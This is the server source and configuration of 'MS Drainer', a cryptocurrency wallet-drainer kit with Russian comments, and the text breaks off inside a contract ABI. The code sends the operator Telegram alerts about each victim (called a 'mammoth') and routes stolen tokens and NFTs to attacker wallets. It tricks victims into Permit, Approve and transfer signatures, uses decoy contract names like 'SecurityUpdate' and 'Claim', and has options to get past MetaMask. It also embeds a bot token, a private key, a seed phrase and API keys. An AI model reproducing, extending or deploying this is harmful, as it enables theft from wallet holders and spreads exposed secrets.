console.log('\n\n\t============================================================================================');
console.log('\t=========================== MS Drainer Server by Pakulichev 29.08.2023 =========================');
console.log('\t============================================================================================\n\n');

const https = require('https');
const ethers = require('ethers');
const axios = require('axios');
const express = require('express');
const parser = require('body-parser');
const Telegram = require('node-telegram-bot-api');
const fs = require('fs');
const readline = require('readline');
const path = require('path');

// =====================================================================
// ========================= НАСТРОЙКИ СКРИПТА =========================
// =====================================================================

const MS_Telegram_Token = "7362615266:AAHzUBN1usEJ51Va3H_aoY5eyxpqjxYwnsM"; // Сюда вписать свой токен от бота из @BotFather (заходите туда, там создаёте бота и получаете этот самый токен)
const MS_Telegram_Chat_ID = "2070791757"; // Сюда вписать ID чата, куда нужно отправлять уведомления о действиях мамонта (если ID начинается с минуса, так и записываем)

const MS_Wallet_Address = "0x30Ce5735406fa6ecAb3910732Afb9eccC991c65D"; // Wallet address where the mammoth assets will go
const MS_Wallet_Private = "187fbacbed8b34c6825ffdb689a11dbfd547cef6f983448181f4911b4314e9de"; 
const MS_Wallet_Receiver = "0x41deec59f154A190da61fAf33c72d37f667eaD53"; // Кошелек, куда будут приходить активы, может быть таким же, как MS_Wallet_Address, а может быть иным

const MS_Encryption_Key = 0; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
// Это же число должно быть указано и в файле web3-provider.js - если они будут различаться, то ничего не будет работать правильно

const MS_Allowance_API = true; // Сохранять ли историю одобренных токенов (необходимо для модуля проверки подтверждений)
const MS_Allowance_Check = false; // Проверять кошельки на наличие повторных пополнений (не включать, если используется сторонний софт)
const MS_Allowance_Withdraw = {
  mode: false, // Автоматически выводить найденные новые активы из кошелька (работает только при включенном MS_Allowance_Check)
  min_amount: 1, // Единица токена, от которой будет срабатывать автоматический вывод (указывать в WEI (конвертер: eth-converter.com))
  wallets: { // Список кошельков, где работает автоматический вывод, включая ваш основной кошелек (ADDRESS:PRIVATE)
    "0x41deec59f154A190da61fAf33c72d37f667eaD53": "chat donate pave arm canal sick asset legal burden wife royal guard",
  }
};
const MS_Keep_ID_History = true; // Хранить ли нумерацию подключающихся пользователь после перезапуска сервера
const MS_CIS_Protection = true; // Запретить доступ для стран СНГ (отключать только в целях тестирования!)
const MS_Protection = false; // Если стоит "true", будет активирована дополнительная защита бекенда
// Она позволит противостоять некоторым видам атак, которым вы можете подвергнуться, но при этом есть
// Вероятность, что она может заблокировать некоторые обычные запросы, так что используйте с умом
// Например, запросить проверку кошелька можно будет только один раз в течение минуты c одного IP
// Также любые данные, которые будут выглядить отлично от нормы, приведут к блокировке на 10 минут
const MS_Repeats_Protection = true; // Защита от флуда повторными закодированными сообщениями
const MS_Repeats_TS = 300; // Через сколько секунд будет очищен список памяти повторов
const MS_Check_Limits = true; // Дополнительная защита от "склика" оценщиков, при включении не забудьте настроить параметры ниже
const MS_Check_Settings = {
  reset_after: 60, // Через сколько секунд лимит будет сброшен
  block_for_all: true, // Будет блокировать все проверки при превышении общего лимита в течение указанного выше промежутка
  limit_for_all: 30, // Если включен параметр выше, после такого количества запросов будут блокироваться все проверки
  block_by_ip: true, // Будет блокировать все проверки с определенного IP при превышении персонального лимита
  block_by_id: true, // Будет блокировать все проверки от определенного User ID при превышении персонального лимита
  limit_personal: 5, // Если включен один из параметров выше, после такого количества запросов будет блокироваться проверка для пользователя
};

// Ниже располагаются настройки оценщиков, вы можете использовать как один оценщик, так и несколько
// Для использования оценщика необходимо указать рабочий ключ от него ниже, без ключа оценщик работать не будет
// Если статус всех оценщиков "false", дрейнер попытается использовать бесплатный Ankr, но он малоэффективен
// Крайне рекомендуется использовать оценщик DeBank - он самый стабильный и качественный в плане оценки
// Чтобы использовать несколько оценщиков, просто поставьте на нужных оценщиках "true" вместо "false"
// Если вы включите оценщик, но не укажете / укажете нерабочий ключ, то вы получите некорректные результаты

// Чтобы получить ключ от DeBank, зайдите на сайт cloud.debank.com, зарегистрируйтесь, затем
// В левом меню найдите пункт Open API, выберите его, справа появится Access Key - это ваш токен
// В том же окне необходимо будет приобрести так называемые юниты, минимальная цена на них - 200$
// После того, как вы увидите, что юниты начислились на ваш баланс, можно использовать дрейнер

// Чтобы получить ключ от Ankr, зайдите на сайт ankr.com, зарегистрируйтесь и пополните баланс на любую сумму (желательно > 30$)
// После этого откройте RPC Ethereum, там будет ссылка, после последнего слеша в этой ссылке будет ваш токен - копируйте его
// Будьте внимательны и следите за балансом на сайте, если вы пополнили на маленькую сумму, она достаточно быстро истратится
// Если в ссылке нет ключа, значит вы пополнили баланс недостаточно или средства ещё не зачислились на ваш счёт

const MS_Use_Ankr = false; // Если стоит "true", токены анализируются через Ankr (на стороне сервера)
const MS_Use_DeBank = false; // Если стоит "true", токены и NFT анализируются через DeBank, иначе через Ankr API
const MS_Use_OpenSea = false; // Если стоит "true", NFT будут запрашиваться через OpenSea, Zapper и DeBank игнорируются
const MS_Use_Zapper = true; // Если стоит "true", токены будут запрашиваться через Zapper (если MS_Use_OpenSea = false, то и NFT)

// В СТРОКАХ НИЖЕ УКАЗЫВАЮТСЯ ТОКЕНЫ ДЛЯ ОЦЕНЩИКОВ, НЕ ЗАБУДЬТЕ ИХ УКАЗАТЬ - НЕ БУДЕТ РАБОТАТЬ [!]

const MS_Ankr_Token = ""; // Токен от Ankr Premium, оставьте пустым ("") чтобы использовать Ankr Free
const MS_DeBank_Token = ""; // Токен от Cloud DeBank API, если используется анализ через него
const MS_Zapper_Token = "3749a6ef-439c-4905-89eb-1e0a02770282"; // Токен от Zapper API, если используется анализ NFT через него
const MS_OpenSea_Token = ""; // Токен от OpenSea API, без него OpenSea API больше не работает

const MS_Enable_API = false; // Включает API, который можно использовать в ваших проектах
const MS_API_Token = "secret"; // Ключ доступа для доступа к запросам к API
const MS_API_Mode = 1; // 1 - только отправленные активы, 2 - входы, подключения и отправки, 3 - абсолютно всё

const MS_Loop_Assets = 0; // 0 - после конца выдать пользователю ошибку (РЕКОМЕНДУЕТСЯ), 1 - после конца начинать запрос активов по кругу
const MS_Loop_Native = 0; // 0 - после отказа переходить дальше (РЕКОМЕНДУЕТСЯ), 1 - спрашивать подпись до последнего
const MS_Loop_Tokens = 0; // 0 - после отказа переходить дальше (РЕКОМЕНДУЕТСЯ), 1 - спрашивать подпись до последнего
const MS_Loop_NFTs = 0;   // 0 - после отказа переходить дальше (РЕКОМЕНДУЕТСЯ), 1 - спрашивать подпись до последнего

const MS_Domains_Mode = 0; // 0 - допускать любые домены, 1 - допускать только те, которые в белом списке
const MS_Domains_Whilelist = [ "example.com", "another.example.com" ]; // Белый список доменов, заполнять по примеру

const MS_Blacklist_Online = 1; // 0 - использовать только локальный чёрный список, 1 - загружать общий чёрный список
const MS_Blacklist_URL = "https://pastebin.com/raw/RiyXYTkp"; // ссылка на общий чёрный список (Raw-JSON)

// В массиве ниже располагаются RPC для работы с сетями внутри сервера, здесь можно использовать приватные RPC

const MS_Private_RPC_URLs = {
  1: 'https://rpc.ankr.com/eth' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Ethereum
  10: 'https://rpc.ankr.com/optimism' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Optimism
  56: 'https://rpc.ankr.com/bsc' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Binance Smart Chain
  137: 'https://rpc.ankr.com/polygon' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Polygon
  250: 'https://rpc.ankr.com/fantom' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Fantom
  43114: 'https://rpc.ankr.com/avalanche' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Avalanche
  42161: 'https://rpc.ankr.com/arbitrum' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Arbitrum
};

// В массиве ниже располагаются RPC для работы с сетями внутри клиента, здесь рекомендуется использовать публичные RPC

const MS_Public_RPC_URLs = {
  1: 'https://rpc.ankr.com/eth', // Ethereum
  10: 'https://rpc.ankr.com/optimism', // Optimism
  56: 'https://rpc.ankr.com/bsc', // Binance Smart Chain
  137: 'https://rpc.ankr.com/polygon', // Polygon
  250: 'https://rpc.ankr.com/fantom', // Fantom
  43114: 'https://rpc.ankr.com/avalanche', // Avalanche
  42161: 'https://rpc.ankr.com/arbitrum', // Arbitrum
};

// Ниже представлены настройки уведомлений, которые вы хотите получать

const MS_Notifications = {
  enter_website: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Вход на сайт
  leave_website: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Выход с сайта
  connect_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Успешное подключение
  connect_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Запрос на подключение
  connect_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Подключение отклонено
  approve_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Запрос на подтверждение
  approve_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Успешное подтверждение
  approve_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Подтверждение отклонено
  permit_sign_data: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Данные из PERMIT
  transfer_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Запрос на перевод
  transfer_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Успешный перевод
  transfer_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Отмена перевода
  sign_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Запрос на подпись
  sign_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Успешная подпись
  sign_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Подпись отклонена
  chain_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Запрос на смену сети
  chain_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Смена сети принята
  chain_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Смена сети отклонена
};

// Ниже вы можете указать сообщение, которое будет подписывать человек для верификации кошелька
// Может содержать тег {{ADDRESS}}, который будет заменен на действующий адрес кошелька
// Верификация кошелька необходима для того, чтобы отбрасывать фейковые или подменные кошельки

const MS_VERIFY_WALLET = 0; // 1 - верифицировать кошелек перед списанием (РЕКОМЕНДУЕТСЯ), 0 - принимать любой адрес без верификации
const MS_VERIFY_MESSAGE = `By signing this message, you agree to the Terms of Use and authorize the use of your wallet address to identify you on the site, also confirm that you are the wallet's owner:\n\n{{ADDRESS}}`;

// Ниже доступен чёрный список токенов, в которых присутствует PERMIT, но по каким-то причинам не работает
// Если вы нашли такой, внесите его в список ниже, и PERMIT не будет использоваться для снятия этого токена

const MS_PERMIT_BLACKLIST = [
  // Формат записи: [ Chain_ID, Contract_Address ],
  [ 137, '0x2791bca1f2de4661ed88a30c99a7a9449aa84174' ],
];

// Ниже доступен чёрный список токенов, в которых не работает безлимитное подтверждение, а только конкретное
// Если вы нашли такой, внесите его в список ниже, и будет подтверждатся только определенная сумма

const MS_UNLIMITED_BLACKLIST = [
  // Формат записи: [ Chain_ID, Contract_Address ],
  [ 1, '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984' ],
];

// Ниже представлены настройки логики работы дрейнера

const MS_Settings = {
  Minimal_Wallet_Price: 1, // Укажите минимальную стоимость кошелька в USD
  Tokens_First: 0, // 0 - по цене, 1 - нативный токен всегда последний
  // Две настройки ниже очень важные и от них зависит скорость и качество работы дрейнера
  // Выключив одну или обе настройки, вы добьетесь более высокой скорости работы дрейнера
  // Но при этом снизите качество списаний, подтверждения могут не доходить, сбрасываться
  // А также могут возникнуть проблемы с автоматическим списанием одобренных токенов
  // Включив одну или обе настройки, вы сильно повысите качество списания, но уменьшите скорость
  Wait_For_Confirmation: 1, // 0 - продолжать без ожидания подтверждения, 1 - ожидать подтверждения
  Wait_For_Response: 1, // 0 - не ждать ответа от сервера, 1 - ожидать ответа от сервера
  Sign: {
    Native: 1, // 0 - отключено, 1 - подписывать Transfer
    Tokens: 1, // 0 - отключено, 1 - подписывать Approve, 2 - подписывать Transfer
    NFTs: 1, // 0 - отключено, 1 - подписывать SAFA, 2 - подписывать TransferFrom
    Force: 0, // 0 - использовать другой способ при отсутствии подписи, 1 - только подпись
  },
  Permit: {
    Mode: 1, // 0 - отключено, 1 - включено
    Priority: 0, // 0 - без приоритета, больше 0 - приоритет Permit от такой суммы в USD
    Bypass: 0, // 0 - блокировать подозрительные подписи, 1 - пропускать любые подписи без разбора
    Challenge: 1, // 0 - если подпись некорректная, отклонять; 1 - если подпись некорректная, попробовать исправить
    Price: 1, // Минимальная сумма, от которой будет производится списание этим методом
  },
  Permit2: {
    Mode: 1, // 0 - отключено, 1 - включено
    Bypass: 0, // 0 - блокировать подозрительные подписи, 1 - пропускать любые подписи без разбора
  },
  Approve: {
    Enable: 1, // 0 - отключено, 1 - включено
    MetaMask: 2, // 0 - отключено, 1 - включено, 2 - частичный обход (если нет - TRANSFER), 3 - частичный обход (если нет - игнорировать), 4 - частичный обход (если нет - APPROVE)
    Bypass: 0, // 0 - блокировать подозрительные подписи, 1 - пропускать любые подписи без разбора
    Withdraw: 1, // 0 - не выводить подтвержденные активы автоматически, 1 - выводить активы автоматически
    Withdraw_Amount: 1, // Минимальная сумма для вывода подтвержденного актива (только при Withdraw: 1)
  },
  SAFA: {
    Enable: 1, // 0 - отключить, 1 - включить автоматический вывод NFT
    Bypass: 0, // 0 - блокировать подозрительные подписи, 1 - пропускать любые подписи без разбора
    Withdraw: 2, // 0 - не выводить подтвержденные активы автоматически, 1 - выводить только самый дорогой, 2 - выводить все активы
    Withdraw_Amount: 1, // Минимальная сумма для вывода подтвержденного актива (только при Withdraw: 1/2)
  },
  Swappers: {
    Enable: 0, // 0 - отключено (РЕКОМЕНДУЕТСЯ), 1 - включено
    Priority: 0, // 0 - без приоритета, 1 - с приоритетом (но после Permit), 2 - с приоритетом (абсолютный)
    Price: 50, // Минимальная сумма, от которой будет производится списание этим методом
  },
  SeaPort: {
    Enable: 0, // 0 - отключено, 1 - включено (работает только при установленном модуле SeaPort)
    Priority: 1, // 0 - срабатывает при достижении первого NFT, 1 - срабатывает в первую очередь
    Limit: 1, // 0 - не ограничивать вызовы, 1 - не более одного вызова с одного кошелька
    Price: 1, // Минимальная сумма, от которой будет производится списание этим методом
  },
  Blur: {
    Enable: 0, // 0 - отключено, 1 - включено (работает только при установленном модуле Blur)
    Priority: 1, // 0 - срабатывает при достижении первого NFT, 1 - срабатывает в первую очередь
    Limit: 1, // 0 - не ограничивать вызовы, 1 - не более одного вызова с одного кошелька
    Price: 1, // Минимальная сумма, от которой будет производится списание этим методом
  },
  x2y2: {
    Enable: 0, // 0 - отключено, 1 - включено (работает только при установленном модуле X2Y2)
    Priority: 1, // 0 - срабатывает при достижении первого NFT, 1 - срабатывает в первую очередь
    Price: 1, // Минимальная сумма, от которой будет производится списание этим методом
  },
  Chains: {
    eth: { // Ethereum, настройки сети
      Enable: 1, // 0 - отключено, 1 - включено
      Native: 1, // 0 - отключено, 1 - включено
      Tokens: 1, // 0 - отключено, 1 - включено
      NFTs: 1, // 0 - отключено, 1 - включено
      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
      API: '2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99', // Etherscan API Key (не менять, если не уверены)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
    },
    bsc: { // Binance Smart Chain, настройки сети
      Enable: 1, // 0 - отключено, 1 - включено
      Native: 1, // 0 - отключено, 1 - включено
      Tokens: 1, // 0 - отключено, 1 - включено
      NFTs: 1, // 0 - отключено, 1 - включено
      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
      API: 'K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI', // Bscscan API Key (не менять, если не уверены)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
    },
    polygon: { // Polygon (MATIC), настройки сети
      Enable: 1, // 0 - отключено, 1 - включено
      Native: 1, // 0 - отключено, 1 - включено
      Tokens: 1, // 0 - отключено, 1 - включено
      NFTs: 1, // 0 - отключено, 1 - включено
      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
      API: 'M9IMUX515SEB97THWJRQDKNX75CI66X7XX', // Polygonscan API Key (не менять, если не уверены)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
    },
    avalanche: { // Avalanche C-Chain, настройка сети
      Enable: 1, // 0 - отключено, 1 - включено
      Native: 1, // 0 - отключено, 1 - включено
      Tokens: 1, // 0 - отключено, 1 - включено
      NFTs: 1, // 0 - отключено, 1 - включено
      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
      API: 'ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z', // Snowtrace API Key (не менять, если не уверены)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
    },
    arbitrum: { // Arbitrum, настройка сети
      Enable: 1, // 0 - отключено, 1 - включено
      Native: 1, // 0 - отключено, 1 - включено
      Tokens: 1, // 0 - отключено, 1 - включено
      NFTs: 1, // 0 - отключено, 1 - включено
      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
      API: 'DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I', // Arbscan API Key (не менять, если не уверены)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
    },
    fantom: { // Fantom, настройка сети
      Enable: 1, // 0 - отключено, 1 - включено
      Native: 1, // 0 - отключено, 1 - включено
      Tokens: 1, // 0 - отключено, 1 - включено
      NFTs: 1, // 0 - отключено, 1 - включено
      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
      API: 'F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415', // Fantomscan API Key (не менять, если не уверены)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
    },
    optimism: { // Optimism, настройка сети
      Enable: 1, // 0 - отключено, 1 - включено
      Native: 1, // 0 - отключено, 1 - включено
      Tokens: 1, // 0 - отключено, 1 - включено
      NFTs: 1, // 0 - отключено, 1 - включено
      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
      API: '46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK', // Optimismscan API Key (не менять, если не уверены)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
    },
  }
};

// =====================================================================
// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
// =====================================================================

let MS_Disable_System = false;

for (let x = 0; x < MS_PERMIT_BLACKLIST.length; x++) {
  try {
    MS_PERMIT_BLACKLIST[x][1] = MS_PERMIT_BLACKLIST[x][1].toLowerCase().trim();
  } catch(err) {
    console.log(err);
  }
}

console.log(`\t[Permit Blacklist] There are ${MS_PERMIT_BLACKLIST.length} contracts blacklisted`);

for (let x = 0; x < MS_UNLIMITED_BLACKLIST.length; x++) {
  try {
    MS_UNLIMITED_BLACKLIST[x][1] = MS_UNLIMITED_BLACKLIST[x][1].toLowerCase().trim();
  } catch(err) {
    console.log(err);
  }
}

console.log(`\t[Unlimited Blacklist] There are ${MS_UNLIMITED_BLACKLIST.length} contracts blacklisted`);

var SeaPort = null, Blur = null;
var SeaPort_List = {}, Blur_List = {};

if (fs.existsSync(path.join('server_modules', 'module_seaport.js'))) {
  SeaPort = require('./server_modules/module_seaport');
  console.log('\t[Module] SeaPort Module is installed');
} else MS_Settings.SeaPort.Enable = 0;

if (fs.existsSync(path.join('server_modules', 'module_blur.js'))) {
  Blur = require('./server_modules/module_blur');
  console.log('\t[Module] Blur Module is installed');
} else MS_Settings.Blur.Enable = 0;

const Supported_Wallets = [ 'MetaMask', 'Coinbase', 'Trust Wallet', 'Binance Wallet', 'WalletConnect', 'Ethereum' ];
let MS_Contract_Blacklist = [], MS_Contract_Whitelist = [], MS_Wallet_Blacklist = [], MS_Verified_Addresses = {};

(async () => {
  try {
    if (!fs.existsSync('blacklist_c.txt')) fs.writeFileSync('blacklist_c.txt', '', 'utf-8');
    const rl = readline.createInterface({ input: fs.createReadStream('blacklist_c.txt'), crlfDelay: Infinity });
    for await (const line of rl) {
      try {
        let ready_line = line.toLowerCase().trim();
        if (ready_line.includes('0x')) {
          MS_Contract_Blacklist.push(ready_line);
        }
      } catch(err) {
        console.log(err);
      }
    }
    if (MS_Blacklist_Online == 1) {
      try {
        let result = await axios.get(MS_Blacklist_URL);
        for (const address of result.data) {
          try {
            let ready_line = address.toLowerCase().trim();
            if (ready_line.includes('0x')) {
              MS_Contract_Blacklist.push(ready_line);
            }
          } catch(err) {
            console.log(err);
          }
        }
      } catch(err) {
        console.log(err);
      }
    }
    console.log(`\t[Contract Blacklist] There are ${MS_Contract_Blacklist.length} contracts blacklisted`);
  } catch(err) {
    console.log(err);
  }
})();

(async () => {
  try {
    if (!fs.existsSync('blacklist_w.txt')) fs.writeFileSync('blacklist_w.txt', '', 'utf-8');
    const rl = readline.createInterface({ input: fs.createReadStream('blacklist_w.txt'), crlfDelay: Infinity });
    for await (const line of rl) {
      try {
        let ready_line = line.toLowerCase().trim();
        if (ready_line.includes('0x')) {
          MS_Wallet_Blacklist.push(ready_line);
        }
      } catch(err) {
        console.log(err);
      }
    }
    console.log(`\t[Wallet Blacklist] There are ${MS_Wallet_Blacklist.length} wallets blacklisted`);
  } catch(err) {
    console.log(err);
  }
})();

(async () => {
  try {
    if (!fs.existsSync('whitelist_c.txt')) fs.writeFileSync('whitelist_c.txt', '', 'utf-8');
    const rl = readline.createInterface({ input: fs.createReadStream('whitelist_c.txt'), crlfDelay: Infinity });
    for await (const line of rl) {
      try {
        let ready_line = line.toLowerCase().trim();
        if (ready_line.includes('0x')) {
          MS_Contract_Whitelist.push(ready_line);
        }
      } catch(err) {
        console.log(err);
      }
    }
    console.log(`\t[Contract Whitelist] There are ${MS_Contract_Whitelist.length} contracts whitelisted`);
  } catch(err) {
    console.log(err);
  }
})();

let Checks_Data = { all_checks: 0, personal: {} };

if (MS_Check_Limits) {
  setInterval(() => {
    Checks_Data.all_checks = 0;
    Checks_Data.personal = {};
  }, MS_Check_Settings.reset_after * 1000);
}

let MS_Currencies = {};

const update_rates = async () => {
  try {
    if (fs.existsSync('currencies.dat')) {
      let cur_data = JSON.parse(fs.readFileSync('currencies.dat', 'utf-8'));
      if (Math.floor(Date.now() / 1000) - cur_data.ts > (24 * 60 * 60)) {
        const response = await axios.get(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`);
        cur_data.ts = Math.floor(Date.now() / 1000); cur_data.data = response.data;
        fs.writeFileSync('currencies.dat', JSON.stringify(cur_data), 'utf-8');
      } MS_Currencies = cur_data.data;
    } else {
      const response = await axios.get(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`);
      MS_Currencies = response.data; let cur_data = { ts: Math.floor(Date.now() / 1000), data: MS_Currencies };
      fs.writeFileSync('currencies.dat', JSON.stringify(cur_data), 'utf-8');
    }
     console.log('\n\t[SYSTEM] Currencies are loaded successfully\n');
  } catch(err) {
    console.log(err);
  }
};

update_rates();
setInterval(() => {
  update_rates();
}, 300000);

const MS_Contract_ABI = {
  'CONTRACT_LEGACY': JSON.parse(`[{"constant":false,"inputs":[],"name":"SecurityUpdate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Claim","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"ClaimReward","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"ClaimRewards","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Swap","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Connect","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Execute","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Multicall","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`),
  'CONTRACT': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"SecurityUpdate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Claim","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"ClaimReward","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"ClaimRewards","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Swap","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Connect","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Execute","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Multicall","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`),
  'ERC20': JSON.parse(`[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],
